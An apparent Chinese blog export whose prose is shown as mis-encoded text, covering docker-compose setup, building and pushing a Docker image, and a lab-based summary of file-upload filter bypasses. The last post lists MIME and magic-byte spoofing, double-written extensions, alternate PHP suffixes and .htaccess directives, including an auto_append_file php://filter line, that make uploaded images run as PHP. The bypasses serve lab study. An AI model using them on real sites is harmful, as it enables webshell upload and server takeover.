<h1 id="å®‰è£…docker-compose"><a href="#å®‰è£…docker-compose" class="headerlink" title="å®‰è£…docker-compose"></a>å®‰è£…docker-compose</h1><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">curl -L <span class="hljs-string">&quot;https://github.com/docker/compose/releases/download/1.25.0/docker-compose-$(uname -s)-$(uname -m)&quot;</span> -o <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>docker-compose     <span class="hljs-regexp">//</span>ä¸‹è½½docker-compose<br><br>chmod +x <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>docker-compose        <span class="hljs-regexp">//</span>èµ‹äºˆæ‰§è¡Œæƒé™<br><br>docker-compose -version    <span class="hljs-regexp">//</span>æŸ¥çœ‹ç‰ˆæœ¬ä¿¡æ¯&amp;æ˜¯å¦å®‰è£…æˆåŠŸ<br></code></pre></td></tr></table></figure>

<h1 id="Composeæ¨¡æ¿æ–‡ä»¶"><a href="#Composeæ¨¡æ¿æ–‡ä»¶" class="headerlink" title="Composeæ¨¡æ¿æ–‡ä»¶"></a>Composeæ¨¡æ¿æ–‡ä»¶</h1><p>Docker-Composeæ ‡å‡†æ¨¡æ¿æ–‡ä»¶åº”è¯¥åŒ…å«versionã€servicesã€networks ä¸‰å¤§éƒ¨åˆ†ï¼Œæœ€å…³é”®çš„æ˜¯serviceså’Œnetworksä¸¤ä¸ªéƒ¨åˆ†ã€‚</p>
<figure class="highlight nestedtext"><table><tr><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">version</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#x27;2&#x27;</span><br><span class="hljs-attribute">services</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">web</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">dockercloud/hello-world</span><br>    <span class="hljs-attribute">ports</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">8080</span><br>    <span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">front-tier</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">back-tier</span><br><br>  <span class="hljs-attribute">redis</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">redis</span><br>    <span class="hljs-attribute">links</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">web</span><br>    <span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">back-tier</span><br><br>  <span class="hljs-attribute">lb</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">dockercloud/haproxy</span><br>    <span class="hljs-attribute">ports</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">80:80</span><br>    <span class="hljs-attribute">links</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">web</span><br>    <span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">front-tier</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">back-tier</span><br>    <span class="hljs-attribute">volumes</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">/var/run/docker.sock:/var/run/docker.sock</span><br><br><span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">front-tier</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">driver</span><span class="hljs-punctuation">:</span> <span class="hljs-string">bridge</span><br>  <span class="hljs-attribute">back-tier</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">driver</span><span class="hljs-punctuation">:</span> <span class="hljs-string">bridge</span><br></code></pre></td></tr></table></figure>
<p>ä¸‹é¢è§£é‡Šå‡ ä¸ªå¸¸ç”¨çš„å‘½ä»¤</p>
<h2 id="version"><a href="#version" class="headerlink" title="version"></a>version</h2><p>Composeç›®å‰æœ‰ä¸‰ä¸ªç‰ˆæœ¬åˆ†åˆ«ä¸ºVersion 1ï¼ŒVersion 2ï¼ŒVersion 3ï¼ŒComposeåŒºåˆ†Version 1å’ŒVersion 2ï¼ˆCompose 1.6.0+ï¼ŒDocker Engine 1.10.0+ï¼‰ã€‚Version 2æ”¯æŒæ›´å¤šçš„æŒ‡ä»¤ã€‚Version 1å°†æ¥ä¼šè¢«å¼ƒç”¨ã€‚</p>
<h2 id="image"><a href="#image" class="headerlink" title="image"></a>image</h2><p>imageæ˜¯æŒ‡å®šæœåŠ¡çš„é•œåƒåç§°æˆ–é•œåƒIDã€‚å¦‚æœé•œåƒåœ¨æœ¬åœ°ä¸å­˜åœ¨ï¼ŒComposeå°†ä¼šå°è¯•æ‹‰å–é•œåƒã€‚</p>
<h2 id="build"><a href="#build" class="headerlink" title="build"></a>build</h2><p>æœåŠ¡é™¤äº†å¯ä»¥åŸºäºæŒ‡å®šçš„é•œåƒï¼Œè¿˜å¯ä»¥åŸºäºä¸€ä»½Dockerfileï¼Œåœ¨ä½¿ç”¨upå¯åŠ¨æ—¶æ‰§è¡Œæ„å»ºä»»åŠ¡ï¼Œæ„å»ºæ ‡ç­¾æ˜¯buildï¼Œå¯ä»¥æŒ‡å®šDockerfileæ‰€åœ¨æ–‡ä»¶å¤¹çš„è·¯å¾„ã€‚</p>
<p>æ¯”å¦‚å½“å‰ç›®å½•ä¸‹æœ‰Dockerfileï¼Œdocker-compose.yml æ–‡ä»¶</p>
<p>å°±ä¼šåœ¨å½“å‰ç›®å½•ä¸‹å¯»æ‰¾Dockerfileæ–‡ä»¶è¿›è¡Œè‡ªåŠ¨æ„å»ºé•œåƒï¼Œç„¶åä½¿ç”¨é•œåƒå¯åŠ¨æœåŠ¡å®¹å™¨ã€‚</p>
<h2 id="ports"><a href="#ports" class="headerlink" title="ports"></a>ports</h2><p>portsç”¨äºæ˜ å°„ç«¯å£çš„æ ‡ç­¾ã€‚</p>
<h2 id="volumes"><a href="#volumes" class="headerlink" title="volumes"></a>volumes</h2><p>æ•°æ®å·ï¼Œåœ¨å®ƒä¸‹é¢å¯ä»¥å®šä¹‰çš„æ•°æ®å·ï¼ˆåå­—ç­‰ç­‰ï¼‰ï¼Œç„¶åæŒ‚è½½åˆ°ä¸åŒçš„æœåŠ¡ä¸‹å»ä½¿ç”¨</p>
<h2 id="networks"><a href="#networks" class="headerlink" title="networks"></a>networks</h2><p>åº”ç”¨çš„ç½‘ç»œï¼Œåœ¨å®ƒä¸‹é¢å¯ä»¥å®šä¹‰åº”ç”¨çš„åå­—ã€ä½¿ç”¨çš„ç½‘ç»œç±»å‹ç­‰ç­‰</p>
<h1 id="Composeå¸¸ç”¨å‘½ä»¤"><a href="#Composeå¸¸ç”¨å‘½ä»¤" class="headerlink" title="Composeå¸¸ç”¨å‘½ä»¤"></a>Composeå¸¸ç”¨å‘½ä»¤</h1><p><code>docker-compose up</code>ï¼šå¯åŠ¨æœåŠ¡ï¼Œå¦‚æœåœ¨åå°å¯åŠ¨éœ€è¦å‚æ•°-d<br><code>docker-compose stop [name]</code>ï¼šåœæ­¢æœåŠ¡<br><code>docker-compose start [name]</code>ï¼šå¯åŠ¨æœåŠ¡<br><code>docker-compose rm [name]</code>ï¼šåˆ é™¤æœåŠ¡ï¼Œéœ€è¦åœæ­¢æœåŠ¡ï¼Œå¦åˆ™ä½¿ç”¨-få‚æ•°ï¼Œä¸docker rmå‘½ä»¤ç±»ä¼¼<br><code>docker-compose down</code>ï¼šåœæ­¢å¹¶åˆ é™¤å®¹å™¨ï¼Œç½‘ç»œï¼Œé•œåƒå’Œæ•°æ®å·<br><code>docker-compose logs -f [name]</code>ï¼šæŸ¥çœ‹å…·ä½“æœåŠ¡çš„æ—¥å¿—</p>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>åŸºç¡€</tag>
      </tags>
  </entry>
  <entry>
    <title>æ„å»ºdockeré•œåƒå¹¶ä¸Šä¼ è‡³hub</title>
    <url>/posts/6a4ce58/</url>
    <content><![CDATA[<h1 id="ä½¿ç”¨Dockerfileæ„å»ºå®¹å™¨"><a href="#ä½¿ç”¨Dockerfileæ„å»ºå®¹å™¨" class="headerlink" title="ä½¿ç”¨Dockerfileæ„å»ºå®¹å™¨"></a>ä½¿ç”¨Dockerfileæ„å»ºå®¹å™¨</h1><p>å­¦ä¹ Dockerfileçš„æœ€å¥½æ–¹å¼å°±æ˜¯é˜…è¯»åˆ«äººå†™çš„Dockerfileï¼Œé‡åˆ°ä¸ä¼šçš„æŒ‡ä»¤å°±æŸ¥ä¸€æŸ¥Dockerfileçš„<a href="https://docs.docker.com/engine/reference/builder/">æ–‡æ¡£</a></p>
<h2 id="æ–‡ä»¶ç»“æ„"><a href="#æ–‡ä»¶ç»“æ„" class="headerlink" title="æ–‡ä»¶ç»“æ„"></a>æ–‡ä»¶ç»“æ„</h2><p>Dockerfile ä¸€èˆ¬åˆ†ä¸º 4 éƒ¨åˆ†ï¼šåŸºç¡€é•œåƒä¿¡æ¯ã€ç»´æŠ¤è€…ä¿¡æ¯ã€é•œåƒæ“ä½œæŒ‡ä»¤å’Œå®¹å™¨å¯åŠ¨æ—¶æ‰§è¡ŒæŒ‡ä»¤ï¼Œâ€œ#â€ä¸º Dockerfile ä¸­çš„æ³¨é‡Šã€‚<br>Dockerfile ä¸»è¦æŒ‡ä»¤å¦‚ä¸‹ï¼š</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span>ï¼šæŒ‡å®šåŸºç¡€é•œåƒï¼Œå¿…é¡»ä¸ºç¬¬ä¸€ä¸ªå‘½ä»¤ã€‚<br><span class="hljs-keyword">MAINTAINER</span>ï¼šç»´æŠ¤è€…ä¿¡æ¯ã€‚<br><span class="hljs-keyword">RUN</span><span class="language-bash">ï¼šæ„å»ºé•œåƒæ—¶æ‰§è¡Œçš„å‘½ä»¤ã€‚</span><br><span class="hljs-keyword">ADD</span><span class="language-bash">ï¼šå°†æœ¬åœ°æ–‡ä»¶æ·»åŠ åˆ°å®¹å™¨ä¸­ï¼Œtar ç±»å‹æ–‡ä»¶ä¼šè‡ªåŠ¨è§£å‹ï¼ˆç½‘ç»œå‹ç¼©èµ„æºä¸ä¼šè¢«è§£å‹ï¼‰ï¼Œå¯ä»¥è®¿é—®ç½‘ç»œèµ„æºï¼Œç±»ä¼¼ wgetã€‚</span><br><span class="hljs-keyword">COPY</span><span class="language-bash">ï¼šåŠŸèƒ½ç±»ä¼¼ ADDï¼Œä½†æ˜¯æ˜¯ä¸ä¼šè‡ªåŠ¨è§£å‹æ–‡ä»¶ï¼Œä¹Ÿä¸èƒ½è®¿é—®ç½‘ç»œèµ„æºã€‚</span><br><span class="hljs-keyword">CMD</span><span class="language-bash">ï¼šæ„å»ºå®¹å™¨åè°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯åœ¨å®¹å™¨å¯åŠ¨æ—¶æ‰è¿›è¡Œè°ƒç”¨ã€‚</span><br><span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash">ï¼šé…ç½®å®¹å™¨ï¼Œä½¿å…¶å¯æ‰§è¡ŒåŒ–ã€‚é…åˆ CMD å¯çœå»â€œapplicationâ€ï¼Œåªä½¿ç”¨å‚æ•°ã€‚</span><br><span class="hljs-keyword">LABEL</span><span class="language-bash">ï¼šç”¨äºä¸ºé•œåƒæ·»åŠ å…ƒæ•°æ®ã€‚</span><br><span class="hljs-keyword">ENV</span>ï¼šè®¾ç½®ç¯å¢ƒå˜é‡ã€‚<br><span class="hljs-keyword">EXPOSE</span>ï¼šæŒ‡å®šä¸å¤–ç•Œäº¤äº’çš„ç«¯å£ã€‚<br><span class="hljs-keyword">VOLUME</span><span class="language-bash">ï¼šç”¨äºæŒ‡å®šæŒä¹…åŒ–ç›®å½•ã€‚</span><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash">ï¼šå·¥ä½œç›®å½•ï¼Œç±»ä¼¼äº <span class="hljs-built_in">cd</span> å‘½ä»¤ã€‚</span><br><span class="hljs-keyword">USER</span>ï¼šæŒ‡å®šè¿è¡Œå®¹å™¨æ—¶çš„ç”¨æˆ·åæˆ– UIDï¼Œåç»­çš„ <span class="hljs-keyword">RUN</span><span class="language-bash"> ä¹Ÿä¼šä½¿ç”¨æŒ‡å®šç”¨æˆ·ã€‚ä½¿ç”¨ USERæŒ‡å®šç”¨æˆ·æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ç”¨æˆ·åã€UID æˆ– GIDï¼Œæˆ–æ˜¯ä¸¤è€…çš„ç»„åˆã€‚å½“æœåŠ¡ä¸éœ€è¦ç®¡ç†å‘˜æƒé™æ—¶ï¼Œå¯é€šè¿‡è¯¥å‘½ä»¤æŒ‡å®šè¿è¡Œç”¨æˆ·ã€‚</span><br><span class="hljs-keyword">ARG</span>ï¼šç”¨äºæŒ‡å®šä¼ é€’ç»™æ„å»ºè¿è¡Œæ—¶çš„å˜é‡ã€‚<br><span class="hljs-keyword">ONBUILD</span>ï¼šç”¨äºè®¾ç½®é•œåƒè§¦å‘å™¨ã€‚<br></code></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥ä»¥ centos:latest ä¸ºåŸºç¡€é•œåƒï¼Œå®‰è£… jdk1.8 å¹¶æ„å»ºæ–°çš„é•œåƒ centos-jdkã€‚<br>ä¾‹ï¼š</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># CentOS with JDK 8</span><br><span class="hljs-comment"># æŒ‡å®šåŸºç¡€é•œåƒ</span><br>FROM centos<br><span class="hljs-comment"># æŒ‡å®šä½œè€…</span><br>MAINTAINER lewiserii<br><span class="hljs-comment"># æ–°å»ºæ–‡ä»¶å¤¹ç”¨äºå­˜æ”¾ jdk æ–‡ä»¶</span><br>RUN mkdir <span class="hljs-regexp">/usr/</span>local/java<br><span class="hljs-comment"># å°† JDK æ–‡ä»¶å¤åˆ¶åˆ°é•œåƒå†…å¹¶è‡ªåŠ¨è§£å‹</span><br>ADD jdk-<span class="hljs-number">8</span>.tar.gz <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/java/</span><br><span class="hljs-comment"># åˆ›å»ºè½¯é“¾æ¥</span><br>RUN ln -s <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/java/</span>jdk1.<span class="hljs-number">8.0</span>_281 <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/java/</span>jdk<br><span class="hljs-comment"># è®¾ç½®ç¯å¢ƒå˜é‡</span><br>ENV JAVA_HOME=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/java/</span>jdk<br>ENV JRE_HOME=<span class="hljs-variable">$&#123;JAVA_HOME&#125;</span>/jre<br>ENV CLASSPATH=.:<span class="hljs-variable">$&#123;JAVA_HOME&#125;</span><span class="hljs-regexp">/lib:$&#123;JRE_HOME&#125;/</span>lib<br>ENV PATH=<span class="hljs-variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure>

<h2 id="æ„å»ºé•œåƒ"><a href="#æ„å»ºé•œåƒ" class="headerlink" title="æ„å»ºé•œåƒ"></a>æ„å»ºé•œåƒ</h2><p>æ–°å»ºä¸€ä¸ªç›®å½•ï¼Œç„¶ååœ¨æ–°ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªDockerfileï¼ˆæ³¨æ„Dè¦å¤§å†™ï¼‰<br>æ”¾å…¥jdkçš„å‹ç¼©åŒ…<br>å°†ä½ å†™å¥½çš„å†…å®¹å¤åˆ¶è¿›Dockerfileæ–‡ä»¶<br>ä½¿ç”¨buildæ„å»ºé•œåƒ</p>
<blockquote>
<p>docker build -t centos-jdk8:v1.0 .</p>
</blockquote>
<p><img src="/img/docker/docker_hub-1.jpg"></p>
<p>å…¶ä¸­-t centos-jdk:v1.0è¡¨ç¤ºæ‰“åŒ…çš„é•œåƒåä¸ºcentos-jdkï¼Œtagä¸ºv1.0ï¼ˆtagæ˜¯å¯ä»¥ä»»æ„å‘½åçš„ï¼Œä¸ä¸€å®šè¦æ˜¯è¿™ç§æ ¼å¼ï¼‰ï¼Œæ³¨æ„å‘½ä»¤çš„æœ€åæœ‰ä¸€ä¸ª.ï¼Œè¿™ä¸ªè¡¨ç¤ºæ‰“åŒ…çš„ä¸Šä¸‹æ–‡ï¼ˆå…¶å®å°±æ˜¯Dockerfileæ‰€åœ¨ç›®å½•ï¼‰æ˜¯åœ¨å½“å‰ç›®å½•ï¼Œç„¶åç›®å½•ä¸‹çš„Dockerfileå°±ä¼šè¢«ç¼–è¯‘æ‰§è¡Œã€‚</p>
<p>æ‰§è¡Œå®Œæ¯•åè¿è¡Œdocker imageså°±ä¼šå‘ç°å¤šäº†ä¸€ä¸ªcentos-jdké•œåƒã€‚</p>
<p><img src="/img/docker/docker_hub-2.jpg"></p>
<p>å¯ä»¥å…ˆè¿è¡Œä¸€ä¸‹å®¹å™¨æŸ¥çœ‹æ•ˆæœ</p>
<p><img src="/img/docker/docker_hub-3.jpg"></p>
<h1 id="ä¸Šä¼ è‡³docker-hub"><a href="#ä¸Šä¼ è‡³docker-hub" class="headerlink" title="ä¸Šä¼ è‡³docker hub"></a>ä¸Šä¼ è‡³docker hub</h1><p>1:é¦–å…ˆéœ€è¦åœ¨<a href="https://hub.docker.com/">å®˜ç½‘</a>åˆ›å»ºä¸€ä¸ªè´¦æˆ·</p>
<p>2:åœ¨dockerä¸­ç™»é™†</p>
<blockquote>
<p>docker login -u ç”¨æˆ·å -p å¯†ç </p>
</blockquote>
<p><img src="/img/docker/docker_hub-4.jpg"></p>
<p>3:å°†é•œåƒå‘½åä½ çš„ç”¨æˆ·å&#x2F;é•œåƒåè¿™ç§å½¢å¼ï¼Œä¸ç„¶ä¼špushè®¤è¯ä¸é€šè¿‡</p>
<blockquote>
<p>docker tag xxx:xxx ä½ çš„ç”¨æˆ·å&#x2F;é•œåƒå</p>
</blockquote>
<p><img src="/img/docker/docker_hub-5.jpg"></p>
<p>4ï¼šä¸Šä¼ </p>
<blockquote>
<p>docker push ä½ çš„ç”¨æˆ·å&#x2F;é•œåƒå</p>
</blockquote>
<p><img src="/img/docker/docker_hub-6.jpg"></p>
<p>5ï¼šç™»é™†å®˜ç½‘æŸ¥çœ‹é•œåƒä¿¡æ¯<br>åœ¨é¦–é¡µå°±å¯ä»¥çœ‹åˆ°å•¦ï¼Œè¿™æ ·ä½ å°±å¯ä»¥å‘ä½ çš„æœ‹å‹ä»¬åˆ†äº«ä½ çš„é•œåƒäº†<br><img src="/img/docker/docker_hub-7.jpg"></p>
<p>6ï¼šåˆ é™¤hubé•œåƒ<br>è¿›å…¥é•œåƒååœ¨settingsä¸­å¯ä»¥æ‰¾åˆ°delete repositoryé€‰é¡¹<br><img src="/img/docker/docker_hub-8.jpg"></p>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>åŸºç¡€</tag>
      </tags>
  </entry>
  <entry>
    <title>å…³äºæ–‡ä»¶ä¸Šä¼ çš„ä¸€ç‚¹æ€»ç»“</title>
    <url>/posts/5c3aa540/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>éƒ¨åˆ†é¶åœºç”¨çš„æ˜¯å›½å…‰å¸ˆå‚…çš„<a href="https://hub.docker.com/r/sqlsec/ggctf-upload">æ–‡ä»¶ä¸Šä¼ é¶åœºé¡¹ç›®</a> + upload-lab</p>
<h1 id="JavaScriptç»•è¿‡"><a href="#JavaScriptç»•è¿‡" class="headerlink" title="JavaScriptç»•è¿‡"></a>JavaScriptç»•è¿‡</h1><p>F12å¯ä»¥å¾ˆæ¸…æ¥šçš„çœ‹åˆ°ä¸Šä¼ é€»è¾‘</p>
<p><img src="/img/summary/file_upload-1.jpg"></p>
<p>jsç»•è¿‡çš„æ–¹æ³•è¾ƒå¤šï¼ŒæŠ“åŒ…æ”¹åç¼€ï¼Œç¦ç”¨jsæˆ–æ˜¯ç›´æ¥ä¿®æ”¹ä»£ç </p>
<p>è®¿é—®chrome:&#x2F;&#x2F;settings&#x2F;content&#x2F;javascript?search&#x3D;java</p>
<p><img src="/img/summary/file_upload-2.jpg"></p>
<h1 id="MIMEç»•è¿‡"><a href="#MIMEç»•è¿‡" class="headerlink" title="MIMEç»•è¿‡"></a>MIMEç»•è¿‡</h1><p>MIMEéªŒè¯æ˜¯å¯¹æ•°æ®åŒ…çš„Content-Typeç±»å‹è¿›è¡ŒéªŒè¯<br>æˆ‘ä»¬åªéœ€è¦ä¿®æ”¹Content-Typeç±»å‹å³å¯ç»•è¿‡</p>
<p><img src="/img/summary/file_upload-3.jpg"></p>
<p>å¸¸è§çš„ç±»å‹</p>
<blockquote>
<p>text&#x2F;plainï¼ˆçº¯æ–‡æœ¬ï¼‰<br>text&#x2F;htmlï¼ˆHTMLæ–‡æ¡£ï¼‰<br>text&#x2F;javascriptï¼ˆjsä»£ç ï¼‰<br>application&#x2F;xhtml+xmlï¼ˆXHTMLæ–‡æ¡£ï¼‰<br>image&#x2F;gifï¼ˆGIFå›¾åƒï¼‰<br>image&#x2F;jpegï¼ˆJPEGå›¾åƒï¼‰<br>image&#x2F;pngï¼ˆPNGå›¾åƒï¼‰<br>video&#x2F;mpegï¼ˆMPEGåŠ¨ç”»ï¼‰<br>application&#x2F;octet-streamï¼ˆäºŒè¿›åˆ¶æ•°æ®ï¼‰<br>application&#x2F;pdfï¼ˆPDFæ–‡æ¡£ï¼‰<br>application&#x2F;(ç¼–ç¨‹è¯­è¨€) è¯¥ç§è¯­è¨€çš„ä»£ç <br>application&#x2F;mswordï¼ˆMicrosoft Wordæ–‡ä»¶ï¼‰<br>message&#x2F;rfc822ï¼ˆRFC 822å½¢å¼ï¼‰<br>multipart&#x2F;alternativeï¼ˆHTMLé‚®ä»¶çš„HTMLå½¢å¼å’Œçº¯æ–‡æœ¬å½¢å¼ï¼Œç›¸åŒå†…å®¹ä½¿ç”¨ä¸åŒå½¢å¼è¡¨ç¤ºï¼‰<br>application&#x2F;x-www-form-urlencodedï¼ˆ POSTæ–¹æ³•æäº¤çš„è¡¨å•ï¼‰<br>multipart&#x2F;form-dataï¼ˆPOSTæäº¤æ—¶ä¼´éšæ–‡ä»¶ä¸Šä¼ çš„è¡¨å•ï¼‰</p>
</blockquote>
<h1 id="æ–‡ä»¶å¤´ç»•è¿‡"><a href="#æ–‡ä»¶å¤´ç»•è¿‡" class="headerlink" title="æ–‡ä»¶å¤´ç»•è¿‡"></a>æ–‡ä»¶å¤´ç»•è¿‡</h1><p>é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯å¯¹æ–‡ä»¶å¤´çš„éªŒè¯<br>ç”¨010 Editorç­‰åå…­è¿›åˆ¶ç¼–è¾‘å™¨æŸ¥çœ‹å¹¶ä¿®æ”¹</p>
<p><img src="/img/summary/file_upload-4.jpg"></p>
<p>å¸¸è§çš„æ–‡ä»¶å¤´</p>
<blockquote>
<p>PNG çš„æ–‡ä»¶å¤´ä¸º<br>89 50 4E 47 0D 0A 1A 0A</p>
</blockquote>
<blockquote>
<p>GIF(ç›¸å½“äºæ–‡æœ¬çš„GIF89a)ï¼š<br>47 49 46 38 39 61</p>
</blockquote>
<blockquote>
<p>JPG çš„æ–‡ä»¶å¤´ä¸º<br>FF D8 FF E0 00 10 4A 46 49 46</p>
</blockquote>
<blockquote>
<p>ZIP çš„æ–‡ä»¶å¤´ä¸º<br>50 4B 03 04</p>
</blockquote>
<blockquote>
<p>RAR çš„æ–‡ä»¶å¤´ä¸º<br>52 61 72 21</p>
</blockquote>
<h1 id="é»‘åå•å…³é”®è¯æ›¿æ¢ç»•è¿‡"><a href="#é»‘åå•å…³é”®è¯æ›¿æ¢ç»•è¿‡" class="headerlink" title="é»‘åå•å…³é”®è¯æ›¿æ¢ç»•è¿‡"></a>é»‘åå•å…³é”®è¯æ›¿æ¢ç»•è¿‡</h1><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$blacklist</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>);<br><span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$blacklist</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$name</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],UPLOAD_PATH.<span class="hljs-variable">$name</span>))<br></code></pre></td></tr></table></figure>

<p>é»‘åå•å…³é”®è¯æ›¿æ¢ä¸ºç©ºçš„æ“ä½œæ˜¯ä¸€ç§ä¸å®‰å…¨çš„å†™æ³•<br>å¯ä»¥ä½¿ç”¨åŒå†™æ¥ç»•è¿‡<br>å¦‚test.phphpp</p>
<h1 id="windowsç¯å¢ƒ"><a href="#windowsç¯å¢ƒ" class="headerlink" title="windowsç¯å¢ƒ"></a>windowsç¯å¢ƒ</h1><p>è¿˜æ˜¯ä¸Šä¸€é¢˜çš„ä»£ç <br>ä½†æ˜¯åœ¨windowsç¯å¢ƒä¸‹ä¸åŒºåˆ†å¤§å°å†™ï¼Œæ‰€ä»¥å°±å¯ä»¥è®© .PHp å½“åš .php æ¥è§£æäº†ï¼Œä½†æ˜¯ Linux ä¸‹è¿™ç§å¤§å°å†™å¦‚æœçš„è¯å®Œå…¨æ²¡ä½œç”¨</p>
<h1 id="é»‘åå•ç¼ºé™·"><a href="#é»‘åå•ç¼ºé™·" class="headerlink" title="é»‘åå•ç¼ºé™·"></a>é»‘åå•ç¼ºé™·</h1><p>ç™½åå•æ˜¯è®¾ç½®èƒ½é€šè¿‡çš„ç”¨æˆ·ï¼Œç™½åå•ä»¥å¤–çš„ç”¨æˆ·éƒ½ä¸èƒ½é€šè¿‡ã€‚<br>é»‘åå•æ˜¯è®¾ç½®ä¸èƒ½é€šè¿‡çš„ç”¨æˆ·ï¼Œé»‘åå•ä»¥å¤–çš„ç”¨æˆ·éƒ½èƒ½é€šè¿‡ã€‚</p>
<p>æ‰€ä»¥ä¸€èˆ¬æƒ…å†µä¸‹ç™½åå•æ¯”é»‘åå•é™åˆ¶çš„ç”¨æˆ·è¦æ›´å¤šä¸€äº›<br>è¿™é‡Œåˆ©ç”¨çš„æ˜¯phpçš„å¤šåç¼€<br>é»˜è®¤æƒ…å†µä¸‹ Apache æŠŠ phtmlã€phtã€phpã€php3ã€php4ã€php5 è§£æä¸º PHP</p>
<h1 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h1><p>ä¸Šä¼ ä¸€ä¸ª.htaccessæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹</p>
<p><img src="/img/summary/file_upload-5.jpg"></p>
<p>æ„æ€æ˜¯è¿™ä¸ªç›®å½•ä¸‹çš„æ‰€æœ‰ä»¥.pngä¸ºåç¼€çš„æ–‡ä»¶éƒ½ä¼šè¢«è§£æä¸ºphpæ‰§è¡Œ<br>ç„¶åä¸Šä¼ ä¸€ä¸ª1.png</p>
<p><img src="/img/summary/file_upload-6.jpg"></p>
<p>è®¿é—®ä¸Šä¼ çš„1.png<br>æ‰§è¡ŒæˆåŠŸ</p>
<p><img src="/img/summary/file_upload-7.jpg"></p>
<p>æˆ–è€…å¯ä»¥ç»„åˆauto_append_fileæ¥ç»•è¿‡ä¸€äº›å¯¹å†…å®¹çš„é™åˆ¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">AddType application/x-httpd-php .aaa<br>php_value auto_append_file <span class="hljs-string">&quot;php://filter/convert.base64-decode/resource=1.aaa&quot;</span><br></code></pre></td></tr></table></figure>


<h2 id="htaccess-è§£ææˆå›¾ç‰‡"><a href="#htaccess-è§£ææˆå›¾ç‰‡" class="headerlink" title=".htaccess è§£ææˆå›¾ç‰‡"></a>.htaccess è§£ææˆå›¾ç‰‡</h2><p>æ–¹æ³•ä¸€ï¼š</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> width 1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> height 1337</span><br></code></pre></td></tr></table></figure>

<p>æ–¹æ³•äºŒï¼š</p>
<p>åœ¨.htaccesså‰æ·»åŠ <code>x00x00x8ax39x8ax39</code><br>x00x00x8ax39x8ax39 æ˜¯wbmpæ–‡ä»¶çš„æ–‡ä»¶å¤´<br>.htaccessä¸­ä»¥0x00å¼€å¤´çš„åŒæ ·ä¹Ÿæ˜¯æ³¨é‡Šç¬¦ï¼Œæ‰€ä»¥ä¸ä¼šå½±å“.htaccess</p>
